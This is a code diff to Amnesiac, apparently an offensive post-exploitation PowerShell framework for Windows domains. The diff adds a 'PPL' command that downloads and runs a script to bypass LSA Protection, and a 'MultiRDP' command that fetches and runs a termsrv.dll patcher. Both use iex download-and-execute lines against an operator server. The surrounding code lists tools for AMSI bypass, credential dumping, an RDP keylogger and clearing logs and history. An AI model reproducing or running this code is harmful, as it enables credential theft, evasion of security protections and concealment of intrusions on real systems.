@@ -355,11 +355,13 @@ function Amnesiac {
 				"$($global:ServerURL)/SimpleAMSI.ps1",
 				"$($global:ServerURL)/NETAMSI.ps1",
 				"$($global:ServerURL)/HiveDump.ps1",
+				"$($global:ServerURL)/TermsrvPatcher.ps1",
 				"$($global:ServerURL)/Invoke-Patamenia.ps1",
 				"$($global:ServerURL)/Suntour.ps1",
 				"$($global:ServerURL)/Ferrari.ps1",
 				"$($global:ServerURL)/pwv.ps1",
-    				"$($global:ServerURL)/RDPKeylog.exe",
+				"$($global:ServerURL)/ppl.ps1",
+    			"$($global:ServerURL)/RDPKeylog.exe",
 				"$($global:ServerURL)/TGT_Monitor.ps1"
 			)
 			
@@ -927,7 +929,7 @@ function Display-SessionMenu {
  #+#     #+# #+#       #+# #+#   #+#+# #+#       #+#    #+#    #+#     #+#     #+# #+#    #+# 
  ###     ### ###       ### ###    #### ########## ######## ########### ###     ###  ########  ')
 
-	$BannerLink = '                                           [Version: 1.0.4] https://github.com/Leo4j/Amnesiac'
+	$BannerLink = '                                           [Version: 1.0.5] https://github.com/Leo4j/Amnesiac'
 	
 	if($Night){
 		Write-Host $Banner -Foreground blue
@@ -1614,7 +1616,7 @@ function InteractWithPipeSession{
 		
 		$allowedCommands = @(
 			"AV", "Kerb", "Patch", "PatchNet", "PInject", "Services", "ShellGen",
-			"HashGrab", "Rubeus", "PowerView", "Hive", "Dpapi",
+			"HashGrab", "Rubeus", "PowerView", "Hive", "Dpapi", "PPL", "MultiRDP",
 			"Mimi", "AutoMimi", "ClearLogs", "ClearHistory", "Net", "Sessions", "Software", "CredMan", 
 			"Startup", "TLS", "Process"
 		)
@@ -5257,6 +5259,8 @@ function Get-AvailableCommands  {
 	Write-Output " Monitor            Monitor Cache for TGTs"
 	Write-Output " MonitorRead        Retrieve TGTs from Monitor activity"
 	Write-Output " MonitorClear       Clear TGTs from Monitor activity"
+	Write-Output " MultiRDP           Patches termsrv.dll so that multiple users can RDP"
+	Write-Output " PPL                Bypass LSA Protection"
 	Write-Output ""
 	Write-Output ""
 	Write-Host " [+] Domain Actions:" -Foreground cyan
@@ -5418,6 +5422,18 @@ function Get-Command {
 	elseif ($Command -eq "ClearHistory") {
 		$predefinedCommands = @(
 			'Remove-Item -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";Write-Output "[+] History Cleared"'
+		)
+	}
+	
+	elseif ($Command -eq "PPL") {
+		$predefinedCommands = @(
+			"Write-Output '';Write-Output '[+] PPLKiller Loaded | https://github.com/Leo4j/PPLKiller';Write-Output '';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/ppl.ps1');Invoke-PPLKiller"
+		)
+	}
+	
+	elseif ($Command -eq "MultiRDP") {
+		$predefinedCommands = @(
+			"Write-Output '';Write-Output '[+] Enable Multi RDP | https://github.com/fabianosrc/TermsrvPatcher';Write-Output '';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/TermsrvPatcher.ps1')"
 		)
 	}
 	
